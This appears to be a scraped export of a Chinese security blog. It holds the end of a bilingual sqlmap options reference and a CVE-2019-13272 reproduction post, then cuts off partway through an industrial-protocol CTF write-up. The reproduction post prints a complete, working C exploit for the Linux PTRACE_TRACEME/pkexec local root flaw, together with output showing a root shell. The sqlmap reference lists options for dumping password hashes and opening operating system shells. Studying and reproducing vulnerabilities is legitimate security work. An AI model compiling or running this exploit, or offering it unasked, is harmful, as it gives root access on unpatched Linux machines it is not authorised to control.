执行测试的风险（0-3，默认为1）--string=STRING String to match when query is evaluated to True## 查询时有效时在页面匹配字符串--not-string=NOT.. String to match when query is evaluated to False## 当查询求值为无效时匹配的字符串--regexp=REGEXP Regexp to match when query is evaluated to True## 查询时有效时在页面匹配正则表达式--code=CODE HTTP code to match when query is evaluated to True## 当查询求值为True时匹配的HTTP代码--text-only Compare pages based only on the textual content## 仅基于在文本内容比较网页--titles Compare pages based only on their titles## 仅根据他们的标题进行比较 Techniques（技巧）12345678910111213141516171819202122232425262728293031Techniques（技巧）:These options can be used to tweak testing of specific SQL injection techniques## 这些选项可用于调整具体的SQL注入测试。--technique=TECH SQL injection techniques to use (default \"BEUSTQ\")## SQL 注入技术测试（默认BEUST）--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)## DBMS响应的延迟时间（默认为5秒）--union-cols=UCOLS Range of columns to test for UNION query SQL injection## 定列范围用于测试UNION查询注入--union-char=UCHAR Character to use for bruteforcing number of columns## 用于暴力猜解列数的字符--union-from=UFROM Table to use in FROM part of UNION query SQL injection## 要在UNION查询SQL注入的FROM部分使用的表--dns-domain=DNS.. Domain name used for DNS exfiltration attack## 域名用于DNS漏出攻击--second-order=S.. Resulting page URL searched for second-order response## 生成页面的URL搜索为second-order响应 Fingerprint（指纹）12345Fingerprint（指纹）:-f, --fingerprint Perform an extensive DBMS version fingerprint## 执行检查广泛的DBMS版本指纹 Enumeration（枚举）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141Enumeration（枚举）:These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。-a, --all Retrieve everything## 检索一切-b, --banner Retrieve DBMS banner## 检索数据库管理系统的标识--current-user Retrieve DBMS current user## 检索数据库管理系统的 标识--current-db Retrieve DBMS current database## 检索数据库管理系统当前数据库-hostname Retrieve DBMS server hostname## 检索数据库服务器的主机名--is-dba Detect if the DBMS current user is DBA## 检测DBMS当前用户是否DBA--users Enumerate DBMS users## 枚举数据库管理系统用户--passwords Enumerate DBMS users password hashes## 枚举数据库管理系统用户密码哈希--privileges Enumerate DBMS users privileges## 枚举数据库管理系统用户的权限--roles Enumerate DBMS users roles## 枚举数据库管理系统用户的角色--dbs Enumerate DBMS databases## 枚举数据库管理系统数据库--tables Enumerate DBMS database tables## 枚举的DBMS数据库中的表--columns Enumerate DBMS database table columns## 枚举DBMS数据库表列--schema Enumerate DBMS schema## 枚举数据库架构--count Retrieve number of entries for table(s)## 检索表的条目数--dump Dump DBMS database table entries## 转储数据库管理系统的数据库中的表项--dump-all Dump all DBMS databases tables entries## 转储数据库管理系统的数据库中的表项--search Search column(s), table(s) and/or database name(s)## 搜索列（S），表（S）和/或数据库名称（S）--comments Retrieve DBMS comments## 检索数据库的comments(注释、评论)-D DB DBMS database to enumerate## 要进行枚举的数据库名-T TBL DBMS database table(s) to enumerate## 要进行枚举的数据库表-C COL DBMS database table column(s) to enumerate## 要进行枚举的数据库列-X EXCLUDECOL DBMS database table column(s) to not enumerate## 要不进行枚举的数据库列-U USER DBMS user to enumerate## 用来进行枚举的数据库用户--exclude-sysdbs Exclude DBMS system databases when enumerating tables## 枚举表时排除系统数据库--pivot-column=P.. Pivot column name## 主列名称--where=DUMPWHERE Use WHERE condition while table dumping## 使用WHERE条件进行表转储--start=LIMITSTART First query output entry to retrieve## 第一个查询输出进入检索--stop=LIMITSTOP Last query output entry to retrieve## 最后查询的输出进入检索--first=FIRSTCHAR First query output word character to retrieve## 第一个查询输出字的字符检索--last=LASTCHAR Last query output word character to retrieve## 最后查询的输出字字符检索--sql-query=QUERY SQL statement to be executed## 要执行的SQL语句--sql-shell Prompt for an interactive SQL shell## 提示交互式SQL的shell--sql-file=SQLFILE Execute SQL statements from given file(s)## 从给定文件执行SQL语句 Brute Force（蛮力）12345678910111213Brute force（蛮力）:These options can be used to run brute force checks## 这些选项可以被用来运行蛮力检查。--common-tables Check existence of common tables## 检查存在共同表--common-columns Check existence of common columns## 检查存在共同列 User-defined function injection（用户自定义函数注入）12345678910111213User-defined function injection（用户自定义函数注入）:These options can be used to create custom user-defined functions## 这些选项可以用来创建用户自定义函数。--udf-inject Inject custom user-defined functions## 注入用户自定义函数--shared-lib=SHLIB Local path of the shared library## 共享库的本地路径 File system access（访问文件系统）123456789101112131415File system access（访问文件系统）:These options can be used to access the back-end database management system underlying file system## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。--file-read=RFILE Read a file from the back-end DBMS file system## 从后端的数据库管理系统文件系统读取文件--file-write=WFILE Write a local file on the back-end DBMS file system## 编辑后端的数据库管理系统文件系统上的本地文件--file-dest=DFILE Back-end DBMS absolute filepath to write to## 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）12345678910111213141516171819202122232425262728293031323334353637Operating system access（操作系统访问）:These options can be used to access the back-end database management system underlying operating system## 这些选项可以用于访问后端数据库管理系统的底层操作系统。--os-cmd=OSCMD Execute an operating system command## 执行操作系统命令--os-shell Prompt for an interactive operating system shell## 交互式的操作系统的shell--os-pwn Prompt for an OOB shell, Meterpreter or VNC## 获取一个OOB shell，meterpreter或VNC--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC## 一键获取一个OOB shell，meterpreter或VNC--os-bof Stored procedure buffer overflow exploitation## 存储过程缓冲区溢出利用--priv-esc Database process user privilege escalation## 数据库进程用户权限提升--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework## 本地的安装路径--tmp-path=TMPPATH Remote absolute path of temporary files directory## 远程临时文件目录的绝对路径 Windows registry access（Windows注册表访问）123456789101112131415161718192021222324252627282930313233Windows registry access（Windows注册表访问）:These options can be used to access the back-end database management system Windows registry## 这些选项可以被用来访问后端数据库管理系统Windows注册表。--reg-read Read a Windows registry key value## 读一个Windows注册表项值--reg-add Write a Windows registry key value data## 写一个Windows注册表项值数据--reg-del Delete a Windows registry key value## 删除Windows注册表键值--reg-key=REGKEY Windows registry key## Windows注册表键--reg-value=REGVAL Windows registry key value## Windows注册表项值--reg-data=REGDATA Windows registry key value data## Windows注册表键值数据--reg-type=REGTYPE Windows registry key value type## Windows注册表项值类型 General（一般）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889General（一般）:These options can be used to set some general working parameters## 这些选项可以用来设置一些一般的工作参数。-s SESSIONFILE Load session from a stored (.sqlite) file## 保存和恢复检索会话文件的所有数据-t TRAFFICFILE Log all HTTP traffic into a textual file## 记录所有HTTP流量到一个文本文件中--batch Never ask for user input, use the default behaviour## 从不询问用户输入，使用所有默认配置。--binary-fields=.. Result fields having binary values (e.g. \"digest\")## 具有二进制值的结果字段--charset=CHARSET Force character encoding used for data retrieval## 强制用于数据检索的字符编码--crawl=CRAWLDEPTH Crawl the website starting from the target URL## 从目标网址开始抓取网站--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. \"logout\")## 正则表达式排除网页抓取--csv-del=CSVDEL Delimiting character used in CSV output (default \",\")## 分隔CSV输出中使用的字符--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)## 转储数据的格式--eta Display for each output the estimated time of arrival## 显示每个输出的预计到达时间--flush-session Flush session files for current target## 刷新当前目标的会话文件--forms Parse and test forms on target URL## 在目标网址上解析和测试表单--fresh-queries Ignore query results stored in session file## 忽略在会话文件中存储的查询结果--hex Use DBMS hex function(s) for data retrieval## 使用DBMS hex函数进行数据检索--output-dir=OUT.. Custom output directory path## 自定义输出目录路径--parse-errors Parse and display DBMS error messages from responses## 解析和显示响应中的DBMS错误消息--save=SAVECONFIG Save options to a configuration INI file## 保存选项到INI配置文件--scope=SCOPE Regexp to filter targets from provided proxy log## 使用正则表达式从提供的代理日志中过滤目标--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)## 根据有效负载和/或标题(e.g. ROW)选择测试--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）--update Update sqlmap## 更新SqlMap Miscellaneous（杂项）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869Miscellaneous（杂项）:-z MNEMONICS Use short mnemonics (e.g. \"flu,bat,ban,tec=EU\")## 使用简短的助记符--alert=ALERT Run host OS command(s) when SQL injection is found## 在找到SQL注入时运行主机操作系统命令--answers=ANSWERS Set question answers (e.g. \"quit=N,follow=N\")## 设置问题答案--beep Beep on question and/or when SQL injection is found## 发现SQL 注入时提醒--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap## 具体的UDF和表清理DBMS--dependencies Check for missing (non-core) sqlmap dependencies## 检查是否缺少（非内核）sqlmap依赖关系--disable-coloring Disable console output coloring## 禁用控制台输出颜色--gpage=GOOGLEPAGE Use Google dork results from specified page number## 使用Google dork结果指定页码--identify-waf Make a thorough testing for a WAF/IPS/IDS protection## 对WAF / IPS / IDS保护进行全面测试--skip-waf Skip heuristic detection of WAF/IPS/IDS protection## 跳过启发式检测WAF / IPS / IDS保护--mobile Imitate smartphone through HTTP User-Agent header## 通过HTTP User-Agent标头模仿智能手机--offline Work in offline mode (only use session data)## 在离线模式下工作（仅使用会话数据）--page-rank Display page rank (PR) for Google dork results## Google dork结果显示网页排名（PR）--purge-output Safely remove all content from output directory## 安全地从输出目录中删除所有内容--smart Conduct thorough tests only if positive heuristic(s)## 只有在正启发式时才进行彻底测试--sqlmap-shell Prompt for an interactive sqlmap shell## 提示交互式 sqlmap shell--wizard Simple wizard interface for beginner users## 给初级用户的简单向导界面 –By Micropoor","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https:///login546.github.io/categories/渗透测试/"},{"name":"工具","slug":"渗透测试/工具","permalink":"https:///login546.github.io/categories/渗透测试/工具/"}],"tags":[{"name":"sqlmap参数详解","slug":"sqlmap参数详解","permalink":"https:///login546.github.io/tags/sqlmap参数详解/"}]},{"title":"CVE-2019-13272漏洞复现","slug":"CVE-2019-13272漏洞复现","date":"2019-07-30T09:54:52.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2019/07/30/CVE-2019-13272漏洞复现/","link":"","permalink":"https:///login546.github.io/2019/07/30/CVE-2019-13272漏洞复现/","excerpt":"","text":"CVE-2019-13272漏洞复现引言2019年7月29日，网上出现的CVE-2019-13272（Linux本地提权漏洞）的利用脚本，于是拿来复现了一下。 环境准备 Ubuntu 16.04.5 kernel 4.15.0-29-generic(本次复现利用版本) 下载链接 漏洞复现POC： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443// Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)// Uses pkexec technique// ---// Original discovery and exploit author: Jann Horn// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903// ---// &lt;bcoles@gmail.com&gt;// - added known helper paths// - added search for suitable helpers// - added automatic targeting// - changed target suid exectuable from passwd to pkexec// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272// ---// Tested on:// - Ubuntu 16.04.5 kernel 4.15.0-29-generic// - Ubuntu 18.04.1 kernel 4.15.0-20-generic// - Ubuntu 19.04 kernel 5.0.0-15-generic// - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic// - Linux Mint 19 kernel 4.15.0-20-generic// - Xubuntu 16.04.4 kernel 4.13.0-36-generic// - ElementaryOS 0.4.1 4.8.0-52-generic// - Backbox 6 kernel 4.18.0-21-generic// - Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64// - Kali kernel 4.19.0-kali5-amd64// - Redcore 1806 (LXQT) kernel 4.16.16-redcore// - MX 18.3 kernel 4.19.37-2~mx17+1// - RHEL 8.0 kernel 4.18.0-80.el8.x86_64// - Debian 9.4.0 kernel 4.9.0-6-amd64// - Debian 10.0.0 kernel 4.19.0-5-amd64// - Devuan 2.0.0 kernel 4.9.0-6-amd64// - SparkyLinux 5.8 kernel 4.19.0-5-amd64// - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64// - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO// - Mageia 6 kernel 4.9.35-desktop-1.mga6// - Antergos 18.7 kernel 4.17.6-1-ARCH// ---// user@linux-mint-19-2:~$ gcc -s poc.c -o ptrace_traceme_root// user@linux-mint-19-2:~$ ./ptrace_traceme_root// Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)// [.] Checking environment ...// [~] Done, looks good// [.] Searching for known helpers ...// [~] Found known helper: /usr/sbin/mate-power-backlight-helper// [.] Using helper: /usr/sbin/mate-power-backlight-helper// [.] Spawning suid process (/usr/bin/pkexec) ...// [.] Tracing midpid ...// [~] Attached to midpid// To run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".// See \"man sudo_root\" for details.//// root@linux-mint-19-2:/home/user#// ---#define _GNU_SOURCE#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;sched.h&gt;#include &lt;stddef.h&gt;#include &lt;stdarg.h&gt;#include &lt;pwd.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/stat.h&gt;#include &lt;linux/elf.h&gt;#define DEBUG#ifdef DEBUG# define dprintf printf#else# define dprintf#endif#define SAFE(expr) (&#123; \\ typeof(expr) __res = (expr); \\ if (__res == -1) &#123; \\ dprintf(\"[-] Error: %s\\n\", #expr); \\ return 0; \\ &#125; \\ __res; \\&#125;)#define max(a,b) ((a)&gt;(b) ? (a) : (b))static const char *SHELL = \"/bin/bash\";static int middle_success = 1;static int block_pipe[2];static int self_fd = -1;static int dummy_status;static const char *helper_path;static const char *pkexec_path = \"/usr/bin/pkexec\";static const char *pkaction_path = \"/usr/bin/pkaction\";struct stat st;const char *helpers[1024];const char *known_helpers[] = &#123; \"/usr/lib/gnome-settings-daemon/gsd-backlight-helper\", \"/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper\", \"/usr/lib/unity-settings-daemon/usd-backlight-helper\", \"/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper\", \"/usr/sbin/mate-power-backlight-helper\", \"/usr/bin/xfpm-power-backlight-helper\", \"/usr/bin/lxqt-backlight_backend\", \"/usr/libexec/gsd-wacom-led-helper\", \"/usr/libexec/gsd-wacom-oled-helper\", \"/usr/libexec/gsd-backlight-helper\", \"/usr/lib/gsd-backlight-helper\", \"/usr/lib/gsd-wacom-led-helper\", \"/usr/lib/gsd-wacom-oled-helper\",&#125;;/* temporary printf; returned pointer is valid until next tprintf */static char *tprintf(char *fmt, ...) &#123; static char buf[10000]; va_list ap; va_start(ap, fmt); vsprintf(buf, fmt, ap); va_end(ap); return buf;&#125;/* * fork, execute pkexec in parent, force parent to trace our child process, * execute suid executable (pkexec) in child. */static int middle_main(void *dummy) &#123; prctl(PR_SET_PDEATHSIG, SIGKILL); pid_t middle = getpid(); self_fd = SAFE(open(\"/proc/self/exe\", O_RDONLY)); pid_t child = SAFE(fork()); if (child == 0) &#123; prctl(PR_SET_PDEATHSIG, SIGKILL); SAFE(dup2(self_fd, 42)); /* spin until our parent becomes privileged (have to be fast here) */ int proc_fd = SAFE(open(tprintf(\"/proc/%d/status\", middle), O_RDONLY)); char *needle = tprintf(\"\\nUid:\\t%d\\t0\\t\", getuid()); while (1) &#123; char buf[1000]; ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0)); buf[buflen] = '\\0'; if (strstr(buf, needle)) break; &#125; /* * this is where the bug is triggered. * while our parent is in the middle of pkexec, we force it to become our * tracer, with pkexec's creds as ptracer_cred. */ SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL)); /* * now we execute a suid executable (pkexec). * Because the ptrace relationship is considered to be privileged, * this is a proper suid execution despite the attached tracer, * not a degraded one. * at the end of execve(), this process receives a SIGTRAP from ptrace. */ execl(pkexec_path, basename(pkexec_path), NULL); dprintf(\"[-] execl: Executing suid executable failed\"); exit(EXIT_FAILURE); &#125; SAFE(dup2(self_fd, 0)); SAFE(dup2(block_pipe[1], 1)); /* execute pkexec as current user */ struct passwd *pw = getpwuid(getuid()); if (pw == NULL) &#123; dprintf(\"[-] getpwuid: Failed to retrieve username\"); exit(EXIT_FAILURE); &#125; middle_success = 1; execl(pkexec_path, basename(pkexec_path), \"--user\", pw-&gt;pw_name, helper_path, \"--help\", NULL); middle_success = 0; dprintf(\"[-] execl: Executing pkexec failed\"); exit(EXIT_FAILURE);&#125;/* ptrace pid and wait for signal */static int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) &#123; struct user_regs_struct regs; struct iovec iov = &#123; .iov_base = &amp;regs, .iov_len = sizeof(regs) &#125;; SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL)); SAFE(waitpid(pid, &amp;dummy_status, 0)); SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov)); /* set up indirect arguments */ unsigned long scratch_area = (regs.rsp - 0x1000) &amp; ~0xfffUL; struct injected_page &#123; unsigned long argv[2]; unsigned long envv[1]; char arg0[8]; char path[1]; &#125; ipage = &#123; .argv = &#123; scratch_area + offsetof(struct injected_page, arg0) &#125; &#125;; strcpy(ipage.arg0, arg0); for (int i = 0; i &lt; sizeof(ipage)/sizeof(long); i++) &#123; unsigned long pdata = ((unsigned long *)&amp;ipage)[i]; SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long), (void*)pdata)); &#125; /* execveat(exec_fd, path, argv, envv, flags) */ regs.orig_rax = __NR_execveat; regs.rdi = exec_fd; regs.rsi = scratch_area + offsetof(struct injected_page, path); regs.rdx = scratch_area + offsetof(struct injected_page, argv); regs.r10 = scratch_area + offsetof(struct injected_page, envv); regs.r8 = AT_EMPTY_PATH; SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov)); SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL)); SAFE(waitpid(pid, &amp;dummy_status, 0));&#125;static int middle_stage2(void) &#123; /* our child is hanging in signal delivery from execve()'s SIGTRAP */ pid_t child = SAFE(waitpid(-1, &amp;dummy_status, 0)); force_exec_and_wait(child, 42, \"stage3\"); return 0;&#125;// * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * *static int spawn_shell(void) &#123; SAFE(setresgid(0, 0, 0)); SAFE(setresuid(0, 0, 0)); execlp(SHELL, basename(SHELL), NULL); dprintf(\"[-] execlp: Executing shell %s failed\", SHELL); exit(EXIT_FAILURE);&#125;// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * *static int check_env(void) &#123; const char* xdg_session = getenv(\"XDG_SESSION_ID\"); dprintf(\"[.] Checking environment ...\\n\"); if (stat(pkexec_path, &amp;st) != 0) &#123; dprintf(\"[-] Could not find pkexec executable at %s\", pkexec_path); exit(EXIT_FAILURE); &#125; if (stat(pkaction_path, &amp;st) != 0) &#123; dprintf(\"[-] Could not find pkaction executable at %s\", pkaction_path); exit(EXIT_FAILURE); &#125; if (xdg_session == NULL) &#123; dprintf(\"[!] Warning: $XDG_SESSION_ID is not set\\n\"); return 1; &#125; if (system(\"/bin/loginctl --no-ask-password show-session $XDG_SESSION_ID | /bin/grep Remote=no &gt;&gt;/dev/null 2&gt;&gt;/dev/null\") != 0) &#123; dprintf(\"[!] Warning: Could not find active PolKit agent\\n\"); return 1; &#125; if (stat(\"/usr/sbin/getsebool\", &amp;st) == 0) &#123; if (system(\"/usr/sbin/getsebool deny_ptrace 2&gt;1 | /bin/grep -q on\") == 0) &#123; dprintf(\"[!] Warning: SELinux deny_ptrace is enabled\\n\"); return 1; &#125; &#125; dprintf(\"[~] Done, looks good\\n\"); return 0;&#125;/* * Use pkaction to search PolKit policy actions for viable helper executables. * Check each action for allow_active=yes, extract the associated helper path, * and check the helper path exists. */int find_helpers() &#123; char cmd[1024]; snprintf(cmd, sizeof(cmd), \"%s --verbose\", pkaction_path); FILE *fp; fp = popen(cmd, \"r\"); if (fp == NULL) &#123; dprintf(\"[-] Failed to run: %s\\n\", cmd); exit(EXIT_FAILURE); &#125; char line[1024]; char buffer[2048]; int helper_index = 0; int useful_action = 0; static const char *needle = \"org.freedesktop.policykit.exec.path -&gt; \"; int needle_length = strlen(needle); while (fgets(line, sizeof(line)-1, fp) != NULL) &#123; /* check the action uses allow_active=yes*/ if (strstr(line, \"implicit active:\")) &#123; if (strstr(line, \"yes\")) &#123; useful_action = 1; &#125; continue; &#125; if (useful_action == 0) continue; useful_action = 0; /* extract the helper path */ int length = strlen(line); char* found = memmem(&amp;line[0], length, needle, needle_length); if (found == NULL) continue; memset(buffer, 0, sizeof(buffer)); for (int i = 0; found[needle_length + i] != '\\n'; i++) &#123; if (i &gt;= sizeof(buffer)-1) continue; buffer[i] = found[needle_length + i]; &#125; if (strstr(&amp;buffer[0], \"/xf86-video-intel-backlight-helper\") != 0 || strstr(&amp;buffer[0], \"/cpugovctl\") != 0 || strstr(&amp;buffer[0], \"/package-system-locked\") != 0 || strstr(&amp;buffer[0], \"/cddistupgrader\") != 0) &#123; dprintf(\"[.] Ignoring blacklisted helper: %s\\n\", &amp;buffer[0]); continue; &#125; /* check the path exists */ if (stat(&amp;buffer[0], &amp;st) != 0) continue; helpers[helper_index] = strndup(&amp;buffer[0], strlen(buffer)); helper_index++; if (helper_index &gt;= sizeof(helpers)/sizeof(helpers[0])) break; &#125; pclose(fp); return 0;&#125;// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *int ptrace_traceme_root() &#123; dprintf(\"[.] Using helper: %s\\n\", helper_path); /* * set up a pipe such that the next write to it will block: packet mode, * limited to one packet */ SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT)); SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000)); char dummy = 0; SAFE(write(block_pipe[1], &amp;dummy, 1)); /* spawn pkexec in a child, and continue here once our child is in execve() */ dprintf(\"[.] Spawning suid process (%s) ...\\n\", pkexec_path); static char middle_stack[1024*1024]; pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack), CLONE_VM|CLONE_VFORK|SIGCHLD, NULL)); if (!middle_success) return 1; /* * wait for our child to go through both execve() calls (first pkexec, then * the executable permitted by polkit policy). */ while (1) &#123; int fd = open(tprintf(\"/proc/%d/comm\", midpid), O_RDONLY); char buf[16]; int buflen = SAFE(read(fd, buf, sizeof(buf)-1)); buf[buflen] = '\\0'; *strchrnul(buf, '\\n') = '\\0'; if (strncmp(buf, basename(helper_path), 15) == 0) break; usleep(100000); &#125; /* * our child should have gone through both the privileged execve() and the * following execve() here */ dprintf(\"[.] Tracing midpid ...\\n\"); SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL)); SAFE(waitpid(midpid, &amp;dummy_status, 0)); dprintf(\"[~] Attached to midpid\\n\"); force_exec_and_wait(midpid, 0, \"stage2\"); exit(EXIT_SUCCESS);&#125;int main(int argc, char **argv) &#123; if (strcmp(argv[0], \"stage2\") == 0) return middle_stage2(); if (strcmp(argv[0], \"stage3\") == 0) return spawn_shell(); dprintf(\"Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\\n\"); check_env(); if (argc &gt; 1 &amp;&amp; strcmp(argv[1], \"check\") == 0) &#123; exit(0); &#125; /* Search for known helpers defined in 'known_helpers' array */ dprintf(\"[.] Searching for known helpers ...\\n\"); for (int i=0; i&lt;sizeof(known_helpers)/sizeof(known_helpers[0]); i++) &#123; if (stat(known_helpers[i], &amp;st) == 0) &#123; helper_path = known_helpers[i]; dprintf(\"[~] Found known helper: %s\\n\", helper_path); ptrace_traceme_root(); &#125; &#125; /* Search polkit policies for helper executables */ dprintf(\"[.] Searching for useful helpers ...\\n\"); find_helpers(); for (int i=0; i&lt;sizeof(helpers)/sizeof(helpers[0]); i++) &#123; if (helpers[i] == NULL) break; if (stat(helpers[i], &amp;st) == 0) &#123; helper_path = helpers[i]; ptrace_traceme_root(); &#125; &#125; return 0;&#125; 编译执行 提权成功 由于该漏洞利用简单，影响范围广，建议用户在第一时间安装补丁修复。 漏洞修复补丁Download 漏洞相关信息：about","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https:///login546.github.io/categories/漏洞复现/"}],"tags":[{"name":"CVE-2019-13272","slug":"CVE-2019-13272","permalink":"https:///login546.github.io/tags/CVE-2019-13272/"}]},{"title":"2019工业信息安全技能大赛个人线上赛第一场writeup","slug":"2019工业信息安全技能大赛个人线上赛NO-1writeup","date":"2019-07-29T10:25:16.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2019/07/29/2019工业信息安全技能大赛个人线上赛NO-1writeup/","link":"","permalink":"https:///login546.github.io/2019/07/29/2019工业信息安全技能大赛个人线上赛NO-1writeup/","excerpt":"","text":"2019年工业信息安全技能大赛个人线上赛(第一场)writeup1.1.Modbus协议分析（签到题）[未解决]题目：黑客通过外网进入一家工厂的控制网络，之后对工控网络中的操作员站系统进行了攻击，最终通过工控协议破坏了正常的业务。我们得到了操作员站在攻击前后的网络流量数据包，我们需要分析流量中的蛛丝马迹，找到FLAG。 附件下载：1.1.Modbus协议分析（签到题） 利用scu–igroup得到如下 得到的是16进制，我目前暂未解决，但是感觉就是70，我们去转换字符，得到 去提交，试了好多种格式，还是不对，可能不是这个包吧（逃。 注：比赛结束后，经人指点，说我这个包不是签到题的那个，我。。。。。我再去下载一看还真不是，难道是我搞错了？ 莫名其妙。 下面是我找到的flag，瑟瑟发抖。麻痹大意。（逃。 1.2.工业协议分析1题目：工业网络中存在异常，尝试通过分析PCAP流量包，分析出流量数据中的异常点，并拿到FLAG。 附件下载：1.2.工业协议分析1 首先利用scu–igroup大佬的脚本跑了下，未发现有用的信息。之后放到kali里面搜了下关键词png，发现了base64加密的图片 导出数据 1data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAdAAAABiCAYAAADgKILKAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABzXSURBVHhe7Z2Js11Fncfn75maqZmaqZkaS0elXAp1GHRUhGFAQHYQFQRFBWQRiBoBWQyyKaBsxo0tCAgkQHayQEL2jSxAyEoSIAHOvM/JPTPn9fv1Od19+9z3bvh+qr5FkXe77z33ntO/7l//fr/+m0IIIYQQ0ciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAnIgAohhBAJyIAKIYQQCciACiGEEAl0ZkDff78oNm/ZV8xfuK2Y8fxrxex5W4vlK3cVe/Ye6L1CCCGEGF6yGtC33n63uOPuNcW/fHJG8bcffsarf/3UjNLAVtz/h/Xm6/h3IYQQYiKSzYBufePt4thT55qG0NXxp8/ttTqIDGj/vP3Oe+VKf/L1y4qTzppffOq/ni/+6bDpxY+ve7n3irHw/VrKzdsjE6tFL24v7p26rrhs0pLy8x3+pZnFhz/zbDnZ+th/PFd86auzi3MuWFhcc+Py4qFpG4s1694cNcmKYf/+94oXFm4rbr1zdXHe9xcVn/+fWcVHPvv/7/WVk+YU371kcXHbyN9nzd1a7JVXRHxAeGdknFi2Ylfx+FNbiql/3lA8MPK8/+XJzcXLy3eWz80wcdxpc4t//sSMciw55Zz5xXW/WF4+zwcODO46shhQBqCjvzbHNIKWfnjVS72WB2HQtl7XxWB+KDJz9tbiM1+eaX6HTQbUej3KxZKXdxRXTV5aehys92kThm/u/Dd6vbXD9sDd960tPvH558z+fGKicfmPl5RGW4hBsnDx9lGT10q5YTuNyemHDn/WfAYQk8xf3LqyeGPb271W3bLl1X2l0bP01PRXe6/ygwG1ruOLx88uFr+0o/eqbsliQPlhrAvxiZVBHW4Y63Vd3EiHGtOe2Gx+d5XGw4CuWLWrOPv8BWbfsXp25uu9XptZMDIQ+SYRoXrksU293oToFp6Rc7+3yLwPUS7ee+/94r6p64t//Ph0830sYWSffGZLr4duwLt0wcWLzfdHGNE2fAYU/f1HpxezR1ajXdO3Ad24aW/xdx+xL+LIY2cV0597rdj95v7yh9y9e3/pysOFUEcGNA1mcKyerO/us0fNLF2iv/vjht6rx2K1Q6ngAvrlHau890OKdu3a3+vdz2NPbs7ynq++tq/XoxDd8MrGvaUHzrr/6srBu+++X1w5e